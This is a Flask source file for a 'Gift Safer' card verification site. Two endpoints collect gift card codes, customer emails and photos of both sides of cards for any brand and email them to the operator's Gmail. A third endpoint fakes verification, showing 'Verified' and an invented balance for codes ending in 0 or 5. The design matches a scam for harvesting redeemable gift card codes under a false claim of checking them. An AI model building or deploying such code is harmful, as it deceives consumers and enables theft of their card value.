from flask import Flask, render_template, request, jsonify
import os
import time
import uuid
import hashlib
import base64
from datetime import datetime, timezone
from dotenv import load_dotenv
from mailjet_rest import Client


load_dotenv()

app = Flask(__name__)

# ---------------- Config ----------------
MAILJET_API_KEY = os.getenv("MAILJET_API_KEY")
MAILJET_SECRET_KEY = os.getenv("MAILJET_SECRET_KEY")
MAILJET_FROM_EMAIL = os.getenv("MAILJET_FROM_EMAIL", "giftsafer@gmail.com")
MAILJET_FROM_NAME = os.getenv("MAILJET_FROM_NAME", "Gift Safer")
CONTACT_EMAIL = os.getenv("CONTACT_EMAIL", "giftsafer@gmail.com")

#Simple in-memory rate limiter (per IP)
WINDOW_SECONDS = 30
MAX_REQUESTS = 10
_ip_hits = {}  #ip -> list[timestamps]


def now_iso():
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def rate_limited(ip: str) -> bool:
    t = time.time()
    hits = _ip_hits.get(ip, [])
    hits = [h for h in hits if (t - h) <= WINDOW_SECONDS]
    if len(hits) >= MAX_REQUESTS:
        _ip_hits[ip] = hits
        return True
    hits.append(t)
    _ip_hits[ip] = hits
    return False


def matches_demo_format(card_type: str, code: str) -> bool:
    import re
    code = (code or "").strip()

    if card_type == "DemoCard":
        return re.fullmatch(r"DEMO-(\d{4})-(\d{4})-(\d{4})", code) is not None

    if card_type == "SampleTunes":
        return re.fullmatch(r"ST-(\d{12})", code) is not None

    if card_type == "MockFlix":
        return re.fullmatch(r"MF-([A-Za-z0-9]{4})-([A-Za-z0-9]{4})", code) is not None

    return False


def stable_demo_balance(code: str) -> int:
    h = hashlib.sha256(code.encode("utf-8")).hexdigest()
    n = int(h[:6], 16)
    return 1000 + (n % 19001)


def demo_decision(card_type: str, code: str) -> str:
    code = code.strip()
    last = code[-1]
    if last in ("0", "5"):
        return "valid"
    return "invalid"


mailjet = Client(
    auth=(MAILJET_API_KEY, MAILJET_SECRET_KEY),
    version="v3.1"
)

def send_email(subject: str, body: str, attachments=None):
    if not MAILJET_API_KEY or not MAILJET_SECRET_KEY:
        raise RuntimeError("Missing Mailjet API credentials.")

    if not MAILJET_FROM_EMAIL:
        raise RuntimeError("MAILJET_FROM_EMAIL is not set.")

    if not CONTACT_EMAIL:
        raise RuntimeError("CONTACT_EMAIL is not set.")

    message = {
        "From": {"Email": MAILJET_FROM_EMAIL, "Name": MAILJET_FROM_NAME},
        "To": [{"Email": CONTACT_EMAIL}],
        "Subject": subject,
        "TextPart": body,
    }

    if attachments:
        message["Attachments"] = []
        for a in attachments:
            b64 = base64.b64encode(a["data"]).decode("utf-8")
            message["Attachments"].append(
                {
                    "ContentType": f"{a['maintype']}/{a['subtype']}",
                    "Filename": a["filename"],
                    "Base64Content": b64,
                }
            )

    data = {"Messages": [message]}

    result = mailjet.send.create(data=data)

    try:
        payload = result.json()
    except Exception:
        payload = {"raw": getattr(result, "text", None)}

    if result.status_code != 200:
        raise RuntimeError(f"Mailjet HTTP {result.status_code}: {payload}")

    msg0 = (payload.get("Messages") or [{}])[0]
    if msg0.get("Status") != "success":
        raise RuntimeError(f"Mailjet message failed: {msg0}")

    return True


def parse_data_url(data_url: str):
    if not data_url.startswith("data:"):
        raise ValueError("Invalid data URL.")
    header, encoded = data_url.split(",", 1)
    mime = header.split(";")[0].replace("data:", "")
    if "/" not in mime:
        raise ValueError("Invalid mime type.")
    maintype, subtype = mime.split("/", 1)
    return maintype, subtype, base64.b64decode(encoded)


@app.route("/")
def index():
    return render_template("index.html")

@app.route("/admin")
def admin():
    return render_template("admin.html")

@app.route("/api/verify-request", methods=["POST"])
def api_verify_request():
    data = request.get_json(silent=True) or {}
    brand = (data.get("brand") or "").strip()
    code = (data.get("code") or "").strip()
    email = (data.get("email") or "").strip()

    if not brand or not code or not email:
        return jsonify({"ok": False, "message": "Missing brand, code, or email."}), 400

    subject = f"Gift Safer Verification Request - {brand}"
    body = (
        f"Verification request received.\n\n"
        f"Brand: {brand}\n"
        f"Code: {code}\n"
        f"Customer Email: {email}\n"
        f"Received At: {now_iso()}\n"
    )
    try:
        send_email(subject, body)
    except Exception as exc:
        app.logger.exception("Verify email failed")
        return jsonify({"ok": False, "message": str(exc)}), 502
    return jsonify({"ok": True})


@app.route("/api/scan-upload", methods=["POST"])
def api_scan_upload():
    data = request.get_json(silent=True) or {}
    brand = (data.get("brand") or "").strip()
    email = (data.get("email") or "").strip()
    front = data.get("front")
    back = data.get("back")
    mode = (data.get("mode") or "scan").strip()

    if not brand or not email or not front or not back:
        return jsonify({"ok": False, "message": "Missing brand, email, or images."}), 400

    try:
        maintype_f, subtype_f, bytes_f = parse_data_url(front)
        maintype_b, subtype_b, bytes_b = parse_data_url(back)
    except Exception as exc:
        return jsonify({"ok": False, "message": "Invalid image data."}), 400

    subject = f"Gift Safer {mode.capitalize()} Upload - {brand}"
    body = (
        f"Scan upload received.\n\n"
        f"Mode: {mode}\n"
        f"Brand: {brand}\n"
        f"Customer Email: {email}\n"
        f"Received At: {now_iso()}\n"
    )
    attachments = [
        {
            "filename": f"{brand.lower().replace(' ', '_')}_front.{subtype_f}",
            "data": bytes_f,
            "maintype": maintype_f,
            "subtype": subtype_f,
        },
        {
            "filename": f"{brand.lower().replace(' ', '_')}_back.{subtype_b}",
            "data": bytes_b,
            "maintype": maintype_b,
            "subtype": subtype_b,
        },
    ]
    try:
        send_email(subject, body, attachments=attachments)
    except Exception as exc:
        app.logger.exception("Scan upload email failed")
        return jsonify({"ok": False, "message": str(exc)}), 502
    return jsonify({"ok": True})


@app.route("/api/check", methods=["POST"])
def api_check():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "unknown")
    data = request.get_json(silent=True) or {}

    card_type = (data.get("card_type") or "").strip()
    code = (data.get("code") or "").strip().upper()

    reference = uuid.uuid4().hex[:10].upper()

    if rate_limited(ip):
        return jsonify(
            {
                "ok": False,
                "status": "rate_limited",
                "label": "Too many requests",
                "message": f"Rate limit: max {MAX_REQUESTS} checks per {WINDOW_SECONDS}s.",
                "reference": reference,
                "checked_at": now_iso(),
            }
        ), 429

    if card_type not in ("DemoCard", "SampleTunes", "MockFlix"):
        return jsonify(
            {
                "ok": False,
                "status": "invalid",
                "label": "Invalid",
                "message": "Choose a valid card type.",
                "reference": reference,
                "checked_at": now_iso(),
            }
        ), 400

    if not code:
        return jsonify(
            {
                "ok": False,
                "status": "invalid",
                "label": "Invalid",
                "message": "Enter a code.",
                "reference": reference,
                "checked_at": now_iso(),
            }
        ), 400

    if not matches_demo_format(card_type, code):
        return jsonify(
            {
                "ok": True,
                "status": "invalid",
                "label": "Invalid",
                "message": "Code format not recognized for this card type.",
                "reference": reference,
                "checked_at": now_iso(),
            }
        )

    status = demo_decision(card_type, code)

    if status == "valid":
        balance = stable_demo_balance(code)
        return jsonify(
            {
                "ok": True,
                "status": status,
                "label": "Verified",
                "message": "Verification completed.",
                "card_type": card_type,
                "balance": balance,
                "currency": "NGN",
                "reference": reference,
                "checked_at": now_iso(),
            }
        )

    return jsonify(
        {
            "ok": True,
            "status": status,
            "label": "Invalid",
            "message": "Not recognized by rules.",
            "reference": reference,
            "checked_at": now_iso(),
        }
    )


if __name__ == "__main__":
    app.run(debug=True)
